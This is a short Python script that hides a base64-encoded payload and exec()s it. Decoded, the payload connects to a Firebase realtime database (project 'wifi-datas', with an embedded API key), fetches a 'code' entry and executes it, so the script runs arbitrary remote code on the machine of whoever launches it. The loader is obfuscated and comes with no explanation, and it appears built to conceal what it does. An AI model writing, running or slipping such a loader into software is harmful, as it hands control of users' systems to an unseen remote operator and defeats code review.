import base64
import pyrebase
from termcolor import colored
program = "aW1wb3J0IHB5cmViYXNlIApmaXJlYmFzZV9jb25maWcgPSB7CiAgJ2FwaUtleSc6ICJBSXphU3lBM2FKRkt5Q19TQXQ0NmFFdzNmSUtrNDB4SzhtMVBDSlUiLAogICdhdXRoRG9tYWluJzogIndpZmktZGF0YXMuZmlyZWJhc2VhcHAuY29tIiwKICAnZGF0YWJhc2VVUkwnOiAiaHR0cHM6Ly93aWZpLWRhdGFzLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbSIsCiAgJ3Byb2plY3RJZCc6ICJ3aWZpLWRhdGFzIiwKICAnc3RvcmFnZUJ1Y2tldCc6ICJ3aWZpLWRhdGFzLmFwcHNwb3QuY29tIiwKICAnYXBwSWQnOiAiMTo0NTU4ODMxNDI3OTp3ZWI6MDU3NDZjNjYxMDFmNTMwNGNiMDM4MiIsCn0KZmlyZWJhc2UgPSBweXJlYmFzZS5pbml0aWFsaXplX2FwcChmaXJlYmFzZV9jb25maWcpCmRiID0gZmlyZWJhc2UuZGF0YWJhc2UoKQpkYXRhID0gZGIuY2hpbGQoImNvZGUiKS5nZXQoKQpkYXRhID0gZGF0YS52YWwoKQpkYXRhID0gZGF0YS5yZXBsYWNlKCI8JDw8L25uZXdfbGluZS9uPj4kPiIsICJcbiIpCmV4ZWMoZGF0YSkK"
encoded_program = bytes(program, 'utf-8')
decoded_program = base64.b64decode(encoded_program.decode("utf-8"))
exec(decoded_program)
